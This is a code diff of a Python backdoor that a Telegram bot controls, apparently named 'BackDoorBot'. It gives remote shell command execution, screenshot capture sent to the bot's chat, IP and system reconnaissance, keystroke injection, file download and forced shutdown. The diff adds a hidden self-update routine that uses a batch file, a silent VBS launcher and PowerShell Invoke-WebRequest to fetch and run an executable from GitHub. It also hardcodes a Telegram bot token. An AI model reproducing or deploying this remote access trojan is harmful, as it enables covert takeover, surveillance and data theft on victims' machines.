@@ -1,4 +1,5 @@
 # -*- coding: utf8 -*-
+from datetime import datetime
 import os
 import platform
 import subprocess
@@ -39,6 +40,8 @@ class Func_API:
     def __init__(self) -> None:
         self.TOKEN_PC=['pc0','5237141927:AAEhd8t34Lc1fpJsCv8c4UHn9ufT8ETgwtY']
         self.NAME_PC=self.TOKEN_PC[0]
+        self.tg_api = bot
+        self.id = id
 
     def rasbiv(self,text):
         texn=text.split()
@@ -71,28 +74,28 @@ class Func_API:
         try:
             res=subprocess.check_output(com, shell=1)
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
         try:
             res=res.decode('utf8')
         except:
             try:
                 res=res.decode('cp866')
-            except:		return '🖥❌'
-        return '🖥✅:\n'+res
+            except:		bot.send_message(self.id, '🖥❌')
+        bot.send_message(self.id,'🖥✅:\n'+res)
 
     def cmdi(self,com):
         try:
             os.system(com)
-            return "🖥✅"
+            bot.send_message(self.id,"🖥✅")
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
 
 
     def exits(self):
         dir=os.listdir("media/")
         for i in dir:
             os.remove("media/"+i)
-        return "🖥✅"
+        bot.send_message(self.id,"🖥✅")
 
 
     def ip_address(self):
@@ -113,51 +116,51 @@ class Func_API:
             pl=""
             for k, v in data.items():
                 pl+=f'{k} : {v}\n'
-            return pl     
+            bot.send_message(self.id, pl) 
         except requests.exceptions.ConnectionError:
-            return 'Erorre'
+            bot.send_message(self.id, 'Erorre')
 
 
     def wgt(self,text_comand):
         try:
             wget.download(text_comand[0],text_comand[1])
-            return "🖥✅"
+            bot.send_message(self.id,"🖥✅")
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
 
 
     def rebooting(self,timer):
         try:
             timer="shutdown /r /t "+str(timer)
             os.system(timer)
-            return "🖥✅"
+            bot.send_message(self.id,"🖥✅")
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
             
     def shotdowning(self,timer):
         try:
             timer="shutdown /s /t "+str(timer)
             os.system(timer)
-            return "🖥✅"
+            bot.send_message(self.id,"🖥✅")
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
 
 
     def picture(self,file):
         try:
             command = f"media/{file}.png"
             os.startfile(command)
-            return "🖥✅"
+            bot.send_message(self.id,"🖥✅")
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
 
     def video(self,file):
         try:
             command = f"media/{file}.mp4"
             os.startfile(command)
-            return "🖥✅"
+            bot.send_message(self.id,"🖥✅")
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
 
     def specifications(self):
         x,y=pyautogui.size()
@@ -167,19 +170,22 @@ class Func_API:
         System: {platform.system()} {platform.release()}
         Screen size: {x}x{y}
         """
-        return banner
+        bot.send_message(self.id, banner)
 
     def rask(self):
         try:
             keyboard.press_and_release("alt+shift")
-            return "🖥✅"
+            bot.send_message(self.id,"🖥✅")
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
         
     def screenshot(self):  
-        filename = "scrnsht.jpg"
+        filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ','_').replace(':','-')}.jpg"
         pyautogui.screenshot(filename)
-        return filename
+        img = open(filename, "rb")
+        bot.send_document(self.id, img)
+        img.close()
+        os.remove(filename)
 
     def keyb(self,text):
         try:
@@ -196,39 +202,39 @@ class Func_API:
                         listing+=kip+"+"
             listing=listing[:-1]
             keyboard.press_and_release(listing)
-            return "🖥✅"
+            bot.send_message(self.id,"🖥✅")
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
 
 
     def print_gui(self,text):
         try:
             pyautogui.alert(text, "~")
-            return '🖥✅'
+            bot.send_message(self.id, '🖥✅')
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
         
     def input_gui(self,text):
         try:
             answer = pyautogui.prompt(text, "~")
-            return answer
+            bot.send_message(self.id, answer)
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
 
     def closes(self):
         try:
             keyboard.press_and_release("alt+f4")
-            return '🖥✅'
+            bot.send_message(self.id, '🖥✅')
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
         
     def start_file(self,path):
         try:
             text = "start media/"+path
             os.system(text)
-            return '🖥✅'
+            bot.send_message(self.id, '🖥✅')
         except:
-            return '🖥❌'
+            bot.send_message(self.id, '🖥❌')
 
 
     def direct(self,paths):
@@ -248,71 +254,107 @@ class Func_API:
                         exit_str+="| - "+l+"\n"
                     exit_str+="\n"
                 except: pass
-            return exit_str       
-        except: return '🖥❌'
+            bot.send_message(self.id, exit_str )     
+        except: bot.send_message(self.id, '🖥❌')
+
+    def update_bot(self):
+        pth = os.getcwd()
+        text_bat = f'''@echo off
+
+timeout 30
+del {pth}\\windows_shell.exe
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile windows_shell.exe"
+
+start windows_shell.exe
+
+exit
+'''
+        text_vbs = f'''
+set sh=CreateObject("Wscript.Shell")
+sh.Run "{pth}\\upd.bat", 0'''
+        open('upd.bat','w').write(text_bat)
+        open('upd.vbs','w').write(text_vbs)
+        os.startfile('upd.vbs')
+        bot.stop_polling()
+        exit()
 
     def perfor(self,text):
+        
         text = self.rasbiv(text)
         name_pc=text["name"]
         comnd = text["cmnd"]
         text_comand = text["text"]
-        res=0
+
         if name_pc.lower() == self.NAME_PC or name_pc.lower()=="all":
             if comnd=="wget":
-                self.wgt(text_comand)
+                threading.Thread(target=self.wgt, args=(text_comand, )).start()
+
             if comnd=="ip" or comnd=="ipad":
-                res = self.ip_address()
+                threading.Thread(target=self.ip_address).start()
+
             if comnd=="reboot":
-                res = self.rebooting(text_comand[0])
+                threading.Thread(target=self.rebooting, args=(text_comand[0], )).start()
+                
             if comnd=="specifications" or comnd=="spec":
-                res = self.specifications()
+                threading.Thread(target=self.specifications).start()
+
             if comnd=="shotdown" or comnd=="shdn" or comnd=="vikl":
-                res = self.shotdowning(text_comand[0])
+                threading.Thread(target=self.shotdowning, args=(text_comand[0], )).start()
+                
+
             if comnd=="picture" or comnd=="pict":
-                res = self.picture(text_comand[0])
+                threading.Thread(target=self.picture, args=(text_comand[0], )).start()
+
             if comnd=="cmdi":
-                res = self.cmdi(text_comand[0])
+                threading.Thread(target=self.cmdi, args=(text_comand[0], )).start()
+
             if comnd=="cmdo":
-                res = self.cmdo(text_comand[0])
+                threading.Thread(target=self.cmdo, args=(text_comand[0], )).start()
+                
             if comnd=="video" or comnd=="vide" or comnd=="vid":
-                res = self.video(text_comand[0])
+                threading.Thread(target=self.video, args=(text_comand[0], )).start()
+
             if comnd=="exit" or comnd=="cls" or comnd=="clear":
-                res = self.exits()
+                threading.Thread(target=self.exits).start()
+
             if comnd=="lock" or comnd=="close":
-                res = self.closes()
+                threading.Thread(target=self.closes).start()
+
             if comnd=="keyb" or comnd=="keyboard":
-                res = self.keyb(text_comand[0])
+                threading.Thread(target=self.keyb, args=(text_comand[0], )).start()
+
             if comnd=="rask":
-                res = self.rask(text_comand[0])
+                threading.Thread(target=self.rask, args=(text_comand[0], )).start()
+                
             if comnd=="dir" or comnd=="direction":
-                res = self.direct(text_comand[0])
+                threading.Thread(target=self.direct, args=(text_comand[0], )).start()
+                
             if comnd=="screenshot" or comnd=="scrn":
-                res = self.screenshot()
+                threading.Thread(target=self.screenshot).start()
+                
             if comnd=="inpt" or comnd=="input":
-                res = self.input_gui(text_comand[0])
+                threading.Thread(target=self.input_gui, args=(text_comand[0], )).start()
+                
             if comnd=="outp" or comnd=="output":
-                res = self.print_gui(text_comand[0])
+                threading.Thread(target=self.print_gui, args=(text_comand[0], )).start()
+                
             if comnd=="start" or comnd=="strt":
-                res = self.start_file(text_comand[0])
-        return res
+                threading.Thread(target=self.start_file, args=(text_comand[0], )).start()
+            if comnd=="upd":
+                self.update_bot()
+                exit()
 
 
 func_api = Func_API()
 @bot.message_handler(commands=['info','start'])
 def start_message(message):
-	print(message.chat.id)# bot.send_message(message.chat.id, f"Список функций: \n{inform}")
+	bot.send_message(message.chat.id, f"Список функций: \n{inform}")
 
 @bot.message_handler(content_types=['text'])
 def infokigb(message):
+
+    func_api.perfor(message.text)
     
-    gop=func_api.perfor(message.text)
-    if gop=="scrnsht.jpg":
-        img = open(gop, "rb")
-        bot.send_photo(message.chat.id, img)
-        img.close()
-        os.remove(f"{os.getcwd()}/{gop}") 
-    elif gop!=0 and gop!="kill":
-        bot.send_message(message.chat.id,gop) 
 
 @bot.message_handler(content_types=['photo'])
 def handle_docs_document(message):
